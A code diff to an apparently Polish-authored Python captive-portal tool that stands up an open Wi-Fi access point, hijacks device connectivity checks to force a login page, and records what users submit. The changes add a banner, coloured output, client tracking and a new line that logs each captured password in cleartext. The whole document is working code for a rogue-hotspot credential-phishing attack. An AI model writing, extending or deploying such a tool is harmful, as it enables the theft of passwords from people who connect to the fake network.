@@ -11,7 +11,22 @@ import logging
 from urllib.parse import parse_qs
 
 # Konfiguracja logowania
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.INFO, format='%(levelname)s - %(message)s')
+
+COLOR_RESET = "\033[0m"
+COLOR_CYAN = "\033[96m"
+COLOR_MAGENTA = "\033[95m"
+
+
+def print_banner():
+    banner = f"""{COLOR_MAGENTA} _      _    ___   ____ 
+| |    | |  / _ \\ | ___|
+| |    | | | | | ||___ \\
+| |____| | | |_| | ___) |
+|______|_|  \\___/ |____/ {COLOR_RESET}"""
+    print(banner)
+    print("portal wizard")
+    print()
 
 # Konfiguracja
 AP_INTERFACE = "wlan0"
@@ -176,7 +191,9 @@ def select_interface(interfaces):
     logging.info("Available interfaces:")
     for index, name in enumerate(interfaces, start=1):
         chipset = get_interface_chipset(name)
-        logging.info("  %d) %s - %s", index, name, chipset)
+        label = f"{COLOR_CYAN}{index}) {name}{COLOR_RESET}"
+        logging.info("  %s - %s", label, chipset)
+    logging.info("")
 
     while True:
         choice = input("Select AP interface (number or name): ").strip()
@@ -213,6 +230,7 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         "/success.txt",
         "/library/test/success.html",
     }
+    connected_clients = set()
 
     def _redirect_to_portal(self):
         self.send_response(302)
@@ -223,7 +241,11 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
 
     def do_GET(self):
         """Handle GET requests - display login page"""
-        logging.info("Portal connection from %s to %s", self.client_address[0], self.path)
+        client_ip = self.client_address[0]
+        if client_ip not in self.connected_clients:
+            self.connected_clients.add(client_ip)
+            logging.info("Client connected: %s (total: %d)", client_ip, len(self.connected_clients))
+        logging.info("Portal request from %s to %s", client_ip, self.path)
 
         if self.path in self.PORTAL_PATHS:
             if self.path in {"/generate_204", "/gen_204", "/redirect", "/connecttest.txt", "/ncsi.txt"}:
@@ -247,7 +269,10 @@ class CaptivePortalHandler(BaseHTTPRequestHandler):
         post_data = self.rfile.read(content_length)
         decoded = post_data.decode("utf-8", errors="replace")
         parsed = parse_qs(decoded)
-        logging.info("Portal submission from %s", self.client_address[0])
+        client_ip = self.client_address[0]
+        logging.info("Portal submission from %s", client_ip)
+        if "password" in parsed and parsed["password"]:
+            logging.info("Password captured from %s: %s", client_ip, parsed["password"][0])
 
         if CAPTURE_FILE_PATH:
             timestamp = datetime.now().isoformat(sep=" ", timespec="seconds")
@@ -389,6 +414,7 @@ def cleanup():
 
 def main():
     """Główna funkcja"""
+    print_banner()
     logging.info("Starting Captive Portal System")
     
     # Sprawdź uprawnienia
@@ -434,10 +460,8 @@ def main():
         http_server = start_captive_portal()
         
         logging.info("=" * 50)
-        logging.info(f"Captive Portal is running!")
-        logging.info(f"SSID: {AP_SSID}")
-        logging.info("Network is open (no password).")
-        logging.info(f"Connect to WiFi and open any website to see the portal")
+        logging.info("Portal status: running")
+        logging.info("SSID: %s", AP_SSID)
         logging.info("=" * 50)
         logging.info("Press Ctrl+C to stop")
         
